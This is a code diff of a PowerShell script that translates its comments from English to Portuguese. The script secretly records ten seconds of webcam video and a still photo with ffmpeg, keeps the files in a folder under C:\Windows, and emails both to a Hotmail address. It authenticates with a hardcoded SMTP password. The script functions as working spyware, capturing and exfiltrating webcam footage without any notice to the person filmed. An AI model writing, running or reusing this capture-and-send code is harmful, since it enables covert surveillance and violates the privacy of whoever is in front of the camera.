@@ -1,33 +1,29 @@
-# PowerShell script to capture a picture from a webcam using ffmpeg
-
-# Set the path where you want to save the captured image
+# onde guarda a foto e o video
 $savePath = "C:\Windows\Martelo\captured_image.jpg"
+$tempVideoFile = "C:\Windows\Martelo\video.mp4"
 
-# Set the webcam device name (replace with the correct name from the output of the command)
+# Nome da webcam
 $webcamDeviceName = "GENERAL WEBCAM"
 
-# Set the resolution of the captured image (update with the correct values)
+# resolucao para a foto
 $width = 640
 $height = 480
 
-# Set the path to the ffmpeg executable
+# path do ffmpeg.exe
 $ffmpegPath = "C:\Windows\Martelo\ffmpeg-2024-01-20-git-6c4388b468-essentials_build\bin\ffmpeg.exe"
 
-# Set the filename of the temporary video file
-$tempVideoFile = "C:\Windows\Martelo\video.mp4"
-
-# Use ffmpeg to capture a video from the webcam
+# grava um video de 10 segundos com o ffmpeg
 & $ffmpegPath -f dshow -i video="$webcamDeviceName" -s ${width}x${height} -t 10 -y $tempVideoFile
 
-# Use ffmpeg to extract a single frame (image) from the captured video
+# usa o ffmpeg para extrair um frame do video gravado
 & $ffmpegPath -i $tempVideoFile -vf "select=eq(n\,0)" -vframes 1 -q:v 2 -y "$savePath"
 
-Write-Host "Image captured and saved to: $savePath"
-Write-Host "Video captured and saved to: $tempVideoFile"
+Write-Host "Imagem guardada: $savePath"
+Write-Host "Video guardado: $tempVideoFile"
 
 
 
-# Declare global variables
+# Declara variaveis 
 $global:EmailFrom = "a061423049123@hotmail.com"
 $global:EmailTo = "a061423049123@hotmail.com"
 $global:Password = "SimplePassword123"
@@ -38,7 +34,7 @@ $global:SMTPClient = New-Object Net.Mail.SmtpClient($global:SMTPServer, 587)
 $global:SMTPClient.EnableSsl = $true
 $global:SMTPClient.Credentials = New-Object System.Net.NetworkCredential($global:EmailFrom, $global:Password)
 
-# Create a MailMessage object
+# cria o MailMessage object
 function createMailMessage {
     # Use global variables
     $global:MailMessage = New-Object Net.Mail.MailMessage
@@ -48,10 +44,10 @@ function createMailMessage {
     $global:MailMessage.Body = $global:Body
 }
 
-# Create an Attachment
+# cria o attachment
 function createAttachment {
     createMailMessage
-    # Create an Attachment object and add it to the MailMessage
+    # adiciona os attachments ao mail (foto e video)
     $file = "C:\Windows\Martelo\captured_image.jpg"
     $Attachment = New-Object Net.Mail.Attachment($file)
 
@@ -62,7 +58,7 @@ function createAttachment {
     $global:MailMessage.Attachments.Add($Attachment2)
 }
 
-# Send the email
+# envia o mail
 function sendMail {
     createAttachment
     try {
@@ -74,7 +70,7 @@ function sendMail {
     }
 }
 
-# Call the sendMail function to initiate the process
+# iniciar o envio do mail
 
 if (sendMail) {
     write-host "`n[+] Email sent to -> $global:EmailTo [+]`n"
